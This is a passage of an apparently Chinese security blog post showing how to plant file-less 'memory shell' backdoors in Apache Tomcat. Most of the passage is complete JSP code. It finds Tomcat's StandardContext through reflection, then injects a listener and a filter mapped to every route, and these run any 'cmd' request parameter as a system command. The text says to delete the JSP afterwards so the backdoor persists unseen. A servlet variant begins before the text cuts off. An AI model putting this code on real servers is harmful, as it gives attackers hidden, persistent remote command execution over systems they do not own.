&#123;</span><br><span class="line">                Object target = <span class="keyword">this</span>.getField(thread, <span class="string">&quot;target&quot;</span>);</span><br><span class="line">                HashMap children;</span><br><span class="line">                Object jioEndPoint = <span class="keyword">null</span>;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    jioEndPoint = getField(target, <span class="string">&quot;this$0&quot;</span>);</span><br><span class="line">                &#125;<span class="keyword">catch</span> (Exception e)&#123;&#125;</span><br><span class="line">                <span class="keyword">if</span> (jioEndPoint == <span class="keyword">null</span>)&#123;</span><br><span class="line">                    <span class="keyword">try</span>&#123;</span><br><span class="line">                        jioEndPoint = getField(target, <span class="string">&quot;endpoint&quot;</span>);</span><br><span class="line">                    &#125;<span class="keyword">catch</span> (Exception e)&#123; <span class="keyword">return</span>; &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                Object service = getField(getField(getField(getField(getField(jioEndPoint, <span class="string">&quot;handler&quot;</span>), <span class="string">&quot;proto&quot;</span>), <span class="string">&quot;adapter&quot;</span>), <span class="string">&quot;connector&quot;</span>), <span class="string">&quot;service&quot;</span>);</span><br><span class="line">                StandardEngine engine = <span class="keyword">null</span>;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    engine = (StandardEngine) getField(service, <span class="string">&quot;container&quot;</span>);</span><br><span class="line">                &#125;<span class="keyword">catch</span> (Exception e)&#123;&#125;</span><br><span class="line">                <span class="keyword">if</span> (engine == <span class="keyword">null</span>)&#123;</span><br><span class="line">                    engine = (StandardEngine) getField(service, <span class="string">&quot;engine&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                children = (HashMap) getField(engine, <span class="string">&quot;children&quot;</span>);</span><br><span class="line">                StandardHost standardHost = (StandardHost) children.get(<span class="keyword">this</span>.serverName);</span><br><span class="line"></span><br><span class="line">                children = (HashMap) getField(standardHost, <span class="string">&quot;children&quot;</span>);</span><br><span class="line">                Iterator iterator = children.keySet().iterator();</span><br><span class="line">                <span class="keyword">while</span> (iterator.hasNext())&#123;</span><br><span class="line">                    String contextKey = (String) iterator.next();</span><br><span class="line">                    <span class="keyword">if</span> (!(<span class="keyword">this</span>.uri.startsWith(contextKey)))&#123;<span class="keyword">continue</span>;&#125;</span><br><span class="line">                    StandardContext standardContext = (StandardContext) children.get(contextKey);</span><br><span class="line">                    <span class="keyword">this</span>.standardContext = standardContext;</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> StandardContext <span class="title">getSTC</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.standardContext;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">//获取StandardContext对象</span></span><br><span class="line">		Tomcat6789 a = <span class="keyword">new</span> Tomcat6789();</span><br><span class="line">		StandardContext standardContext = a.getSTC();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//构造listener对象</span></span><br><span class="line">        ServletRequestListener listener = <span class="keyword">new</span> ServletRequestListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">requestDestroyed</span><span class="params">(ServletRequestEvent sre)</span> </span>&#123;</span><br><span class="line">                HttpServletRequest req = (HttpServletRequest) sre.getServletRequest();</span><br><span class="line">                String cmd = req.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (cmd != <span class="keyword">null</span>)&#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();</span><br><span class="line">                        Scanner s = <span class="keyword">new</span> Scanner(in).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">                        String output = s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">                        Field requestF = req.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">                        requestF.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                        Request request = (Request)requestF.get(req);</span><br><span class="line">                        PrintWriter out= request.getResponse().getWriter();</span><br><span class="line">                        out.println(output);</span><br><span class="line">                        out.flush();</span><br><span class="line">                        out.close();</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">catch</span> (Exception e) &#123;&#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">requestInitialized</span><span class="params">(ServletRequestEvent sre)</span> </span>&#123;&#125;</span><br><span class="line">        &#125;;</span><br><span class="line">		<span class="comment">//将listener添加到初始化的应用程序事件侦听器列表的末尾</span></span><br><span class="line">        standardContext.addApplicationEventListener(listener);</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>访问注入内存马的jsp文件，然后删除jsp文件，访问任意路由，添加cmd参数执行命令</p>
<p><img src="image-20220228210933114.png" alt="image-20220228210933114"></p>
<h3 id="Filter内存马实现"><a href="#Filter内存马实现" class="headerlink" title="Filter内存马实现"></a>Filter内存马实现</h3><ol>
<li>获取filterConfigs</li>
<li>创建恶意filter</li>
<li>获取FilterDef对象并设置filter、filterName和filterClass</li>
<li>调用addFilterDef为Context添加一个Filter定义</li>
<li>获取FilterMap并设置其URLPattern、FilterName和Dispatcher</li>
<li>添加一个Filter映射到这个Context</li>
<li>获取ApplicationFilterConfig，注入filterDef</li>
</ol>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span>%&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardEngine&quot;</span>%&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardHost&quot;</span>%&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span>%&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.HashMap&quot;</span>%&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Iterator&quot;</span>%&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Map&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Scanner&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.Context&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.PrintWriter&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Tomcat6789</span> </span>&#123;</span><br><span class="line">        String uri;</span><br><span class="line">        String serverName;</span><br><span class="line">        StandardContext standardContext;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> Object <span class="title">getField</span><span class="params">(Object object, String fieldName)</span> </span>&#123;</span><br><span class="line">            Field declaredField;</span><br><span class="line">            Class clazz = object.getClass();</span><br><span class="line">            <span class="keyword">while</span> (clazz != Object.class) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">                    declaredField = clazz.getDeclaredField(fieldName);</span><br><span class="line">                    declaredField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                    <span class="keyword">return</span> declaredField.get(object);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (NoSuchFieldException e)&#123;&#125;</span><br><span class="line">                <span class="keyword">catch</span> (IllegalAccessException e)&#123;&#125;</span><br><span class="line">                clazz = clazz.getSuperclass();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">Tomcat6789</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            Thread[] threads = (Thread[]) <span class="keyword">this</span>.getField(Thread.currentThread().getThreadGroup(), <span class="string">&quot;threads&quot;</span>);</span><br><span class="line">            Object object;</span><br><span class="line">            <span class="keyword">for</span> (Thread thread : threads) &#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (thread == <span class="keyword">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (thread.getName().contains(<span class="string">&quot;exec&quot;</span>)) &#123;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                Object target = <span class="keyword">this</span>.getField(thread, <span class="string">&quot;target&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (!(target <span class="keyword">instanceof</span> Runnable)) &#123;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    object = getField(getField(getField(target, <span class="string">&quot;this$0&quot;</span>), <span class="string">&quot;handler&quot;</span>), <span class="string">&quot;global&quot;</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (object == <span class="keyword">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                java.util.ArrayList processors = (java.util.ArrayList) getField(object, <span class="string">&quot;processors&quot;</span>);</span><br><span class="line">                Iterator iterator = processors.iterator();</span><br><span class="line">                <span class="keyword">while</span> (iterator.hasNext()) &#123;</span><br><span class="line">                    Object next = iterator.next();</span><br><span class="line"></span><br><span class="line">                    Object req = getField(next, <span class="string">&quot;req&quot;</span>);</span><br><span class="line">                    Object serverPort = getField(req, <span class="string">&quot;serverPort&quot;</span>);</span><br><span class="line">                    <span class="keyword">if</span> (serverPort.equals(-<span class="number">1</span>))&#123;<span class="keyword">continue</span>;&#125;</span><br><span class="line">                    org.apache.tomcat.util.buf.MessageBytes serverNameMB = (org.apache.tomcat.util.buf.MessageBytes) getField(req, <span class="string">&quot;serverNameMB&quot;</span>);</span><br><span class="line">                    <span class="keyword">this</span>.serverName = (String) getField(serverNameMB, <span class="string">&quot;strValue&quot;</span>);</span><br><span class="line">                    <span class="keyword">if</span> (<span class="keyword">this</span>.serverName == <span class="keyword">null</span>)&#123;</span><br><span class="line">                        <span class="keyword">this</span>.serverName = serverNameMB.toString();</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="keyword">this</span>.serverName == <span class="keyword">null</span>)&#123;</span><br><span class="line">                        <span class="keyword">this</span>.serverName = serverNameMB.getString();</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    org.apache.tomcat.util.buf.MessageBytes uriMB = (org.apache.tomcat.util.buf.MessageBytes) getField(req, <span class="string">&quot;uriMB&quot;</span>);</span><br><span class="line">                    <span class="keyword">this</span>.uri = (String) getField(uriMB, <span class="string">&quot;strValue&quot;</span>);</span><br><span class="line">                    <span class="keyword">if</span> (<span class="keyword">this</span>.uri == <span class="keyword">null</span>)&#123;</span><br><span class="line">                        <span class="keyword">this</span>.uri = uriMB.toString();</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="keyword">this</span>.uri == <span class="keyword">null</span>)&#123;</span><br><span class="line">                        <span class="keyword">this</span>.uri = uriMB.getString();</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">this</span>.getStandardContext();</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">getStandardContext</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            Thread[] threads = (Thread[]) <span class="keyword">this</span>.getField(Thread.currentThread().getThreadGroup(), <span class="string">&quot;threads&quot;</span>);</span><br><span class="line">            <span class="keyword">for</span> (Thread thread : threads) &#123;</span><br><span class="line">                <span class="keyword">if</span> (thread == <span class="keyword">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> ((thread.getName().contains(<span class="string">&quot;Acceptor&quot;</span>)) &amp;&amp; (thread.getName().contains(<span class="string">&quot;http&quot;</span>))) &#123;</span><br><span class="line">                    Object target = <span class="keyword">this</span>.getField(thread, <span class="string">&quot;target&quot;</span>);</span><br><span class="line">                    HashMap children;</span><br><span class="line">                    Object jioEndPoint = <span class="keyword">null</span>;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        jioEndPoint = getField(target, <span class="string">&quot;this$0&quot;</span>);</span><br><span class="line">                    &#125;<span class="keyword">catch</span> (Exception e)&#123;&#125;</span><br><span class="line">                    <span class="keyword">if</span> (jioEndPoint == <span class="keyword">null</span>)&#123;</span><br><span class="line">                        <span class="keyword">try</span>&#123;</span><br><span class="line">                            jioEndPoint = getField(target, <span class="string">&quot;endpoint&quot;</span>);</span><br><span class="line">                        &#125;<span class="keyword">catch</span> (Exception e)&#123; <span class="keyword">return</span>; &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    Object service = getField(getField(getField(getField(getField(jioEndPoint, <span class="string">&quot;handler&quot;</span>), <span class="string">&quot;proto&quot;</span>), <span class="string">&quot;adapter&quot;</span>), <span class="string">&quot;connector&quot;</span>), <span class="string">&quot;service&quot;</span>);</span><br><span class="line">                    StandardEngine engine = <span class="keyword">null</span>;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        engine = (StandardEngine) getField(service, <span class="string">&quot;container&quot;</span>);</span><br><span class="line">                    &#125;<span class="keyword">catch</span> (Exception e)&#123;&#125;</span><br><span class="line">                    <span class="keyword">if</span> (engine == <span class="keyword">null</span>)&#123;</span><br><span class="line">                        engine = (StandardEngine) getField(service, <span class="string">&quot;engine&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    children = (HashMap) getField(engine, <span class="string">&quot;children&quot;</span>);</span><br><span class="line">                    StandardHost standardHost = (StandardHost) children.get(<span class="keyword">this</span>.serverName);</span><br><span class="line"></span><br><span class="line">                    children = (HashMap) getField(standardHost, <span class="string">&quot;children&quot;</span>);</span><br><span class="line">                    Iterator iterator = children.keySet().iterator();</span><br><span class="line">                    <span class="keyword">while</span> (iterator.hasNext())&#123;</span><br><span class="line">                        String contextKey = (String) iterator.next();</span><br><span class="line">                        <span class="keyword">if</span> (!(<span class="keyword">this</span>.uri.startsWith(contextKey)))&#123;<span class="keyword">continue</span>;&#125;</span><br><span class="line">                        StandardContext standardContext = (StandardContext) children.get(contextKey);</span><br><span class="line">                        <span class="keyword">this</span>.standardContext = standardContext;</span><br><span class="line">                        <span class="keyword">return</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> StandardContext <span class="title">getSTC</span><span class="params">()</span></span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.standardContext;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">//获取StandardContext对象</span></span><br><span class="line">        Tomcat6789 a = <span class="keyword">new</span> Tomcat6789();</span><br><span class="line">        StandardContext standardContext = a.getSTC();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//// 获取filterConfigs</span></span><br><span class="line">        Field Configs = standardContext.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">        Configs.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Map filterConfigs = (Map) Configs.get(standardContext);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建恶意filter</span></span><br><span class="line">        String FilterName = <span class="string">&quot;CmdFilter&quot;</span>;</span><br><span class="line">        Filter filter = <span class="keyword">new</span> Filter() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(FilterConfig filterConfig)</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">                HttpServletRequest req = (HttpServletRequest) servletRequest;</span><br><span class="line">                <span class="keyword">if</span> (req.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    InputStream in = Runtime.getRuntime().exec(req.getParameter(<span class="string">&quot;cmd&quot;</span>)).getInputStream();</span><br><span class="line">                    Scanner s = <span class="keyword">new</span> Scanner(in).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">                    String output = s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">                    servletResponse.getWriter().write(output);</span><br><span class="line">                    PrintWriter out = servletResponse.getWriter();</span><br><span class="line">                    out.println(output);</span><br><span class="line">                    out.flush();</span><br><span class="line">                    out.close();</span><br><span class="line">                &#125;</span><br><span class="line">                filterChain.doFilter(servletRequest, servletResponse);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取FilterDef对象并设置filter、filterName和filterClass</span></span><br><span class="line">        Class&lt;?&gt; FilterDef = Class.forName(<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span>);</span><br><span class="line">        Constructor declaredConstructor1 = FilterDef.getDeclaredConstructor();</span><br><span class="line">        org.apache.tomcat.util.descriptor.web.FilterDef filterDef = (FilterDef) declaredConstructor1.newInstance();</span><br><span class="line">        filterDef.setFilter(filter);</span><br><span class="line">        filterDef.setFilterName(FilterName);</span><br><span class="line">        filterDef.setFilterClass(filter.getClass().getName());</span><br><span class="line">        <span class="comment">// 调用addFilterDef为Context添加一个Filter定义</span></span><br><span class="line">        standardContext.addFilterDef(filterDef);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取FilterMap并设置其URLPattern、FilterName和Dispatcher</span></span><br><span class="line">        Class&lt;?&gt; FilterMap = Class.forName(<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; declaredConstructor = FilterMap.getDeclaredConstructor();</span><br><span class="line">        org.apache.tomcat.util.descriptor.web.FilterMap filterMap = (FilterMap) declaredConstructor.newInstance();</span><br><span class="line">        filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line">        filterMap.setFilterName(FilterName);</span><br><span class="line">        filterMap.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class="line">        <span class="comment">//添加一个Filter映射到这个Context</span></span><br><span class="line">        standardContext.addFilterMap(filterMap);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取ApplicationFilterConfig，注入filterDef</span></span><br><span class="line">        Class&lt;?&gt; ApplicationFilterConfig = Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; declaredConstructor2 = ApplicationFilterConfig.getDeclaredConstructor(Context.class, FilterDef.class);</span><br><span class="line">        declaredConstructor2.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        org.apache.catalina.core.ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) declaredConstructor2.newInstance(standardContext, filterDef);</span><br><span class="line">        filterConfigs.put(FilterName, filterConfig);</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>访问注入内存马的jsp文件，然后删除jsp文件，访问任意路由，添加cmd参数执行命令</p>
<p><img src="image-20220228213945310.png" alt="image-20220228213945310"></p>
<h3 id="servlet内存马实现"><a href="#servlet内存马实现" class="headerlink" title="servlet内存马实现"></a>servlet内存马实现</h3><ol>
<li>创建恶意servlet</li>
<li>创建wrapper，设置恶意servlet</li>
<li>添加到children容器中</li>
<li>设置servlet映射</li>
</ol>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span 